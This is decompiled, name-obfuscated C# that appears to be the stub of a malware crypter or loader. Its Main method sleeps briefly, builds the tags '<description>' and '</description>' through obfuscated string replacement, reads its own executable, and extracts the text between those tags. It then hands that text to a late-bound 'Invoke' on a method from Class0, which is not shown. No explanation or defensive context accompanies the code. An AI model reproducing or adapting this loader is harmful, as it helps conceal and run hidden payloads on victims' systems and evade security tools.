using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class1
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		new ArrayList();
		Thread.Sleep(1);
		string text = "àption>".Replace("à", "<descri");
		string value = "àiption>".Replace("à", "</descr");
		string text2 = "";
		FileSystem.FileOpen(1, Process.GetCurrentProcess().MainModule!.FileName, (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		checked
		{
			string text3 = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref text3, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			string text4 = text3;
			for (int num = text4.IndexOf(text) + text.Length; num != text.Length - 1; num = text4.IndexOf(text, num) + text.Length)
			{
				text2 = text4.Substring(num, text4.IndexOf(value, num) - num);
			}
			object obj = new string[1] { text2 };
			object obj2 = Class0.smethod_0();
			object[] array = new object[2]
			{
				RuntimeHelpers.GetObjectValue(Class0.smethod_0()),
				RuntimeHelpers.GetObjectValue(obj)
			};
			bool[] array2 = new bool[2] { false, true };
			NewLateBinding.LateCall(obj2, (Type)null, "Invoke", array, (string[])null, (Type[])null, array2, true);
			if (array2[1])
			{
				obj = RuntimeHelpers.GetObjectValue(array[1]);
			}
		}
	}
}
